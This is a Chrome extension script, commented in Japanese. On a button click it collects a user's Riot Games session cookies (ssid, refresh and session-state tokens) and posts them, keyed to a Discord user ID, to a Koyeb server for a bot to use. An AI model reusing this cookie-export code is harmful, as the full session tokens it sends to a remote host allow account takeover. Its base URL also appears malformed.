// --- 送信先ベースURL（Koyebの公開URLに置換してください） ---
const API_BASE = "pure-cherrita-inosuke-6597cf0f.koyeb.app/"; // 例: https://inosuke.koyeb.app

async function fetchNonce() {
  const r = await fetch(`${API_BASE}/nonce`);
  if (!r.ok) throw new Error("nonce fetch failed");
  return (await r.json()).nonce;
}

async function getCookies(domain) {
  return await chrome.cookies.getAll({ domain });
}
const pick = (arr, name) => (arr.find(c => c.name === name) || {}).value;

document.getElementById("btn").onclick = async () => {
  const status = document.getElementById("status");
  const out = document.getElementById("out");
  const userIdInput = document.getElementById("userId");

  status.textContent = ""; out.textContent = "";

  try {
    // ▼ DiscordユーザーIDの検証（数字のみ、長さ 5〜25 桁を許容）
    const userId = (userIdInput.value || "").trim();
    if (!/^\d{5,25}$/.test(userId)) {
      status.innerHTML = '<span class="err">DiscordユーザーIDを数字のみで入力してください（5〜25桁）。</span>';
      return;
    }

    status.textContent = "Nonce取得中...";
    const nonce = await fetchNonce();

    status.textContent = "Cookie取得中...";
    const auth = await getCookies("auth.riotgames.com");
    const root = await getCookies(".riotgames.com");

    if (!auth.find(c=>c.name==="ssid")) {
      status.innerHTML = '<span class="err">未ログイン or ssidが見つかりません。ログイン後に再実行してください。</span>';
      return;
    }

    const payload = {
      version: 1,
      source: "extension",
      nonce,
      sentAt: Math.floor(Date.now()/1000),
      user_id: userId, // ★ 追加
      cookies: {
        auth: {
          ssid: pick(auth,"ssid"),
          clid: pick(auth,"clid"),
          sub:  pick(auth,"sub"),
          tdid: pick(auth,"tdid"),
          csid: pick(auth,"csid")
        },
        root: {
          _cf_bm: pick(root,"_cf_bm"),
          "__Secure-refresh_token_presence": pick(root,"__Secure-refresh_token_presence"),
          "__Secure-session_state": pick(root,"__Secure-session_state")
        }
      },
      cookie_line: [...auth, ...root].map(c => `${c.name}=${c.value}`).join("; ")
    };

    // out.textContent = JSON.stringify(payload, null, 2);

    status.textContent = "サーバーへ送信中...";
    const res = await fetch(`${API_BASE}/riot-cookies`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify(payload)
    });

    const body = await res.json().catch(()=>({}));
    if (!res.ok || body.ok !== true) {
      throw new Error(`POST失敗: ${res.status} ${JSON.stringify(body)}`);
    }
    status.innerHTML = `<span class="ok">保存OK（ユーザーID: ${userId}）。CLI/ボットから利用できます。</span>`;
  } catch (e) {
    status.innerHTML = `<span class="err">${String(e)}}</span>`;
  }
};

